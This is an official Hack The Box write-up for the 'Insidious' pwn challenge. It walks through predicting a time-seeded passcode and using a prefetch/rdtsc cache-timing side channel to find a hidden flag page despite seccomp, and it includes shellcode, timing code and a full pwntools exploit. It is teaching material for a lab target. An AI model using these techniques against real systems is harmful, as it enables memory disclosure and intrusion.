![](../../../../../assets/logo_htb.png)



<img src="../../../../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	<font size="10">Insidious</font>

​		2<sup>nd</sup> May 2024

​		Prepared By: S4muii & Zeeshan1234

​		Challenge Author(s): S4muii & Zeeshan1234

​		Difficulty: <font color=orange>Medium</font>

​		Classification: Official

 



# Synopsis

Insidious is a Medium pwn challenge that features a CPU cache timing side channel attack. By measuring the time taken
by the `prefetch` instruction for accessing a memory address, a valid allocation or address can be inferred. A passkey check
needs to be bypassed which uses `srand` with the current time. Seccomp disables all syscalls except write on the hidden 
allocation which contains the flag.

# Description

Old tech was much better. Faster, more powerful, more efficient. But few ever understood how it worked. They delegated responsibility of understanding the world to a select few; that was their downfall. Once the few had gone, what was left? A wealth of technological power - but nobody to understand it. Years passed, and the old tech faded away. Into nothingness. This mission is for the fate of civilisation, but it's also for the pride of the new world. Can you regain what was once lost? Or is the apex of humanity's power and understanding destined to forever be in the past?

## Skills Required

- Understanding of C code
- Basic understanding of assembly

## Skills Learned

- Side-channel attacks
- Understanding of `prefetch` instructions


# Enumeration
The program creates a hidden allocation at a random address and loads the contents of the flag inside it:

```c
void *address = NULL;
void *allocation = NULL;
int fd;

// random bytes for address of the allocation
fd = open("/dev/urandom", O_RDONLY);
read(fd,&address, 3);
read(fd,&shellcode_addr,4);
close(fd);

// page aligned
address = (void *)((unsigned long)address << 16);

// create a hidden allocation for the flag
allocation = mmap(address, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
assert(allocation == address);

ctx = seccomp_init(SCMP_ACT_KILL);
assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,SCMP_A1_64(SCMP_CMP_EQ,(unsigned long)allocation)) == 0);

// read the flag to the allocation
fd = open("./flag.txt", 0);
assert(fd>0);
assert(read(fd, allocation, 50)>0);
assert(close(fd)==0);
```

It also asks the user for a passcode:

```c
printf("Can you share the crucial passcode that will unlock the mysterious realm's exit? ");
scanf("%u%*c",&passcode);
if (passcode != create_passcode()){
    puts("Wrong pass code");
    exit(EXIT_FAILURE);
}
```

It then runs our provided shellcode. There are a few restrictions, including seccomp:

```c
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,SCMP_A1_64(SCMP_CMP_EQ,(unsigned long)allocation)
```

This makes sure that the only syscall allowed is `write`, and that is only if its second argument is the `allocation` location. This prevents us from scanning memory and printing out every possible location.

There is also a "practise mode" which drops us into a shell with id `ctf(1000)` to prevent us from tampering with the flag or the environment. This still allows us to execute code.

So, in effect, we have to find a way to scan memory for the loaded flag without syscalls. 

# Exploitation

The passcode can be calculated by replicating the code for the `create_passcode()` function and using the current time for `srand()`. We can simply copy-paste the **IDA Decompilation** for that:

```c
// this code is extracted from IDA decompilation.
#include <stdlib.h>
#include <time.h>
#include <stdio.h>

unsigned int passcode() {
    unsigned int v2;

    srand(time(0));

    for (int i = 0; i <=6; ++i)
        rand();
    
    v2 = rand();
    for (int j = rand() % 0x64; j; --j) {
        v2 = 27 * ((((32 * v2) ^ 0xf) >> 7) ^ 0x1f4); 
    }
    return v2;
}
```

Once this is bypassed, we have the issue of finding the allocation location!

To do this, we're going to utilise a _Prefetch Attack_.

## Prefetch Attack

A prefetch attack is a type of side-channel attack that exploits the CPU's **prefetch** mechanism to gain unauthorized access to sensitive data. The CPU prefetch mechanism is designed to improve performance by fetching data from memory into cache before it is actually needed. For that reason, the prefetch instructions were created. They're a simple _hint_ to the CPU that this data might be needed in the near future, hence it should be cached for a better response time; as it is a hint, the CPU may ignore it altogether.

In 2016 a group of researchers discovered that, while the `prefetch` instruction _itself_ may not leak data, it may take variable lengths of time depending on the address being prefetched. Even though it doesn't access the memory directly and doesn't generate page-faults on non-mapped pages, it does have an effect. In the [Intel Achitectures Optimization Manuals](https://www.intel.com/content/www/us/en/content-details/671488/intel-64-and-ia-32-architectures-optimization-reference-manual-volume-1.html) (downloadable [here](https://cdrdv2.intel.com/v1/dl/getContent/671488?explicitVersion=true&fileName=248966-046A-software-optimization-manual.pdf)), there is an explanation:

> Prefetching to addresses that are not mapped to physical pages can experience non-deterministic performance penalty. For example specifying a NULL pointer (0L) as address for a prefetch can cause long delays.  

The attack is outlined in [this paper](https://gruss.cc/files/prefetch.pdf).

## Generating Shellcode for Prefetch
Essentially, we need shellcode that measures time access of the `prefetch` instruction. To do this, we're going to use the [`rdtsc`](https://www.felixcloutier.com/x86/rdtsc) instruction, which reads a timestamp into EDX and EAX.

We also know from the decompilation that `allocated` has 3 random bytes with the last 2 bytes NULL:

```c
fd = open("/dev/urandom", O_RDONLY);
read(fd,&address, 3);

[...]

address = (void *)((unsigned long)address << 16);
```

This means we only need to loop through 3 bytes of potential space. The following assembly will store the attempted 3 bytes of brute force in `r14`, then decrement it, prefetching `r14 << 16` each loop. It uses `rdtsc` before and after the prefetch, comparing the timestamps and calculating the difference. This difference is compared to a `THRESHOLD_PARAM` (which we will come to soon) to determine whether or not the address has been accessed previously.

Aside from that, the [`lfence`](https://www.felixcloutier.com/x86/lfence) instruction is used to increase reliability. `lfence` performs a serializing operation on all load-from-memory instructions triggered before it. Importantly, it does not execute until all prior instructions have completed, and no later instruction begins execution until lfence completes. This increases the reliability of timing attacks as it means that the time measured inbetween rtdsc instructions is entirely the time taken for the prefetch instructions, with no external noise from other instructions.

```asm
mov r14,0xffffff

loopStart:
    mov esi,r14d
    shl rsi,0x10
    
    xor ecx,ecx
    xor ebx,ebx
    mov cl,0x10
    
    prefetch_time:
        rdtsc
        mov edi,eax
        lfence

        prefetchnta     [rsi]
        prefetcht2      [rsi]
        prefetcht1      [rsi]
        prefetcht0      [rsi]

        lfence
        rdtsc
        sub eax,edi
        
        add ebx,eax
        loop prefetch_time
              
                
    cmp ebx, {THRESHOLD_PARAM}
    jb win

    dec r14
    jne loopStart

    win:
        mov edi,0x1
        mov edx,0x60

        xor eax,eax
        mov al,SYS_write
        syscall
```

## The Threshold Parameter
We can utilise the _practise mode_ to get a good idea for the threshold value by running this program remotely:

```c
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>

uint32_t prefetch_time(uint64_t addr);
uint32_t prefetch_time_multiple(uint64_t addr);

#define RANDOM_INVALID_ADDRESS (uint64_t)0xdeadbeef
#define LOOP_ITERATIONS 0x10

int main(){
    uint64_t map = (uint64_t)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
    *(int*)map = 123456;    // write something to the map so it's guarnteed to be backed by a physical map

    uint32_t prefetch_on_valid_map   = prefetch_time_multiple(map);
    uint32_t prefetch_on_invalid_map = prefetch_time_multiple(RANDOM_INVALID_ADDRESS);

    printf("prefetch_on_valid_map:%04d\n",  prefetch_on_valid_map);
    printf("prefetch_on_invalid_map:%04d\n",prefetch_on_invalid_map);
    printf("threshold:%04d\n",(uint32_t)(prefetch_on_valid_map+prefetch_on_invalid_map/2));
}

uint32_t prefetch_time_multiple(uint64_t addr){
    uint32_t sum=0;
    for (int i=0;i<LOOP_ITERATIONS;i++)
        sum+= prefetch_time(addr);
    return sum;
}

__attribute__((optimize("O3")))
uint32_t prefetch_time(uint64_t addr){
    asm volatile(    
        "rdtsc;"
        "mov esi,eax;"
        "lfence;"
        
        "prefetchnta     [%0];"
        "prefetcht2      [%0];"
        "prefetcht1      [%0];"
        "prefetcht0      [%0];"

        "lfence;"
        "rdtsc;"
        "sub eax,esi;"
        ::"r"(addr):"rsi","rax"
    );
}
```

This will give us the prefetch time on a valid map and on an invalid map. By averaging the two, we can have a pretty reliable setup.

# Final Solution

## Testing the Prefetch times (`test.c`)

```c
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>

uint32_t prefetch_time(uint64_t addr);
uint32_t prefetch_time_multiple(uint64_t addr);

#define RANDOM_INVALID_ADDRESS (uint64_t)0xdeadbeef
#define LOOP_ITERATIONS 0x10

int main(){
    uint64_t map = (uint64_t)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
    *(int*)map = 123456;    // write something to the map so it's guarnteed to be backed by a physical map

    uint32_t prefetch_on_valid_map   = prefetch_time_multiple(map);
    uint32_t prefetch_on_invalid_map = prefetch_time_multiple(RANDOM_INVALID_ADDRESS);

    printf("prefetch_on_valid_map:%04d\n",  prefetch_on_valid_map);
    printf("prefetch_on_invalid_map:%04d\n",prefetch_on_invalid_map);
    printf("threshold:%04d\n",(uint32_t)(prefetch_on_valid_map+prefetch_on_invalid_map/2));
}

uint32_t prefetch_time_multiple(uint64_t addr){
    uint32_t sum=0;
    for (int i=0;i<LOOP_ITERATIONS;i++)
        sum+= prefetch_time(addr);
    return sum;
}

__attribute__((optimize("O3")))
uint32_t prefetch_time(uint64_t addr){
    asm volatile(    
        "rdtsc;"
        "mov esi,eax;"
        "lfence;"
        
        "prefetchnta     [%0];"
        "prefetcht2      [%0];"
        "prefetcht1      [%0];"
        "prefetcht0      [%0];"

        "lfence;"
        "rdtsc;"
        "sub eax,esi;"
        ::"r"(addr):"rsi","rax"
    );
}
```

## Getting the Passcode (`passcode.c`)
```c
// this code is extracted from IDA decompilation.
#include <stdlib.h>
#include <time.h>
#include <stdio.h>

unsigned int passcode() {
    unsigned int v2;

    srand(time(0));

    for (int i = 0; i <=6; ++i)
        rand();
    
    v2 = rand();
    for (int j = rand() % 0x64; j; --j) {
        v2 = 27 * ((((32 * v2) ^ 0xf) >> 7) ^ 0x1f4); 
    }
    return v2;
}
```

## Makefile for compiling `test.c` and `passcode.c`
```makefile
all:
	gcc -masm=intel -o challenge/insidious source.c -lseccomp
	x86_64-linux-musl-gcc -masm=intel -fno-pie -no-pie -static -o exploit/test exploit/test.c
	gcc -shared ./exploit/passcode.c -o exploit/passcode.so
clean: 
	rm challenge/insidious exploit/passcode.so exploit/test
```

## Final Exploit
```python
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL, c_uint32
import gzip

os.chdir(os.path.dirname(os.path.abspath(__file__)))

context.arch        = 'amd64'

THRESHOLD_PARAM     = None
TEST_ITERATIONS     = 0x10
CHUNK_SIZE          = 0x250
    
# get passcode function
lib                     = CDLL('./passcode.so')
leak_passcode           = lib.passcode
leak_passcode.argtypes  = []
leak_passcode.restype   = c_uint32

def conn():
    if args.REMOTE:
        p = remote(*args.REMOTE.split(':'))
        if b"proof of work" in p.recvline():
            with log.progress("solving POW") as prog:
                with context.silent:
                    sol = process(p.recvline().decode().strip(), shell=True).recvline()
                prog.success(sol.decode())
            p.sendlineafter(b'solution: ', sol)
    else:
        p = process('../insidious')
    return p

def get_threshold():
    global THRESHOLD_PARAM
    p = conn()

    p.sendlineafter(b'retreat from the daunting path ahead? [y/n]', b'n')

    compressed_data = gzip.compress(open('./test','rb').read())
    
    p.recvuntil(b'master the art of navigating supernatural realms\n')
    
    for i in range(0,len(compressed_data),CHUNK_SIZE):
        p.sendline(f'echo {b64e(compressed_data[i:i+CHUNK_SIZE])} | base64 -d >> /tmp/test.gz'.encode())
        
    p.sendline(b'cat /tmp/test.gz | gzip -d > /tmp/test && rm /tmp/test.gz')
    p.sendline(b'chmod +x /tmp/test && /tmp/test')
    
    with log.progress(f'Trying to find the Threshold') as l:
        p.recvuntil(b'prefetch_on_valid_map:')
        valid_map = int(p.recvline().strip())
        p.recvuntil(b'prefetch_on_invalid_map:')
        invalid_map = int(p.recvline().strip())
        THRESHOLD_PARAM = (valid_map+invalid_map)//2
    p.sendline(b'exit')
    p.close()


get_threshold()

shellcode = asm(f'''    
    mov r14,0xffffff
    
    loopStart:
        mov esi,r14d
        shl rsi,0x10
        
        xor ecx,ecx
        xor ebx,ebx
        mov cl,0x10
        
        prefetch_time:
            rdtsc
            mov edi,eax
            lfence
    
            prefetchnta     [rsi]
            prefetcht2      [rsi]
            prefetcht1      [rsi]
            prefetcht0      [rsi]
    
            lfence
            rdtsc
            sub eax,edi
            
            add ebx,eax
            loop prefetch_time
                  
                    
        cmp ebx,{THRESHOLD_PARAM}
        jb win
    
        dec r14
        jne loopStart
    
        win:
            mov edi,0x1
            mov edx,0x60
    
            xor eax,eax
            mov al,SYS_write
            syscall

''')

assert len(shellcode) <= 80

def exploit():
    global p
    p = conn()

    p.sendlineafter(b'retreat from the daunting path ahead? [y/n]', b'y')
    p.sendlineafter(b'Can you share the crucial passcode that will unlock the mysterious realm\'s exit? ', str(leak_passcode()).encode())
    p.sendafter(b'Can you share the detailed 80-step guide for a systematic path to the exit? ', shellcode)

    return p.recvall()


# moment of truth
log.info(f'Trying with Threshold of {THRESHOLD_PARAM}')
for _ in range(10):
    with log.progress('Flag....') as l:
        ret = exploit()
        
        if ret is not None and b'{' in ret:
            flag = ret[ret.find(b'HTB{'):ret.find(b'}')+1]
            l.success(flag.decode())
            exit(0)
        else:
            l.failure()
            p.close()
            time.sleep(1)
```